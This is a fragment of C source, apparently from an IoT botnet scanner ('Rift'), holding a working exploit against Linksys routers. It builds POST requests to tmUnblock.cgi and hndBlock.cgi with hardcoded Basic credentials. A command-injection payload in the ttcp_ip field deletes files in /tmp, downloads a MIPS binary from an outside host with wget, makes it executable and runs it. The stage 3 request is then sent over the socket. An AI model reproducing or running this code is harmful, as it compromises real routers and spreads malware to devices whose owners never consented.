            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    if(conn->state == linksysscanner_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "POST /tmUnblock.cgi HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAuthorization: Basic YWRtaW46cG9ybmh1Yg==\r\nUser-Agent: Rift/2.0\r\nContent-Length: 227\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mipsel%3B+wget+http%3A%2F%2F1.2.3.4%2Fbins%2Frift.mpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl%3B+rm+mpsl%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1\r\n");
                    ...
                    else if(conn->state == linksysscanner_SC_EXPLOIT_STAGE3)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "POST /hndBlock.cgi HTTP/1.1\r\nAuthorization: Basic YWRtaW46cG9ybmh1Yg==\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Rift/2.0\r\nConnection: keep-alive\r\n\r\nttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+*%3B+wget+http%3A%2F%2F1.2.3.4%2Fbins%2Frift.mpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl%3B+rm+mpsl%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1\r\n");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
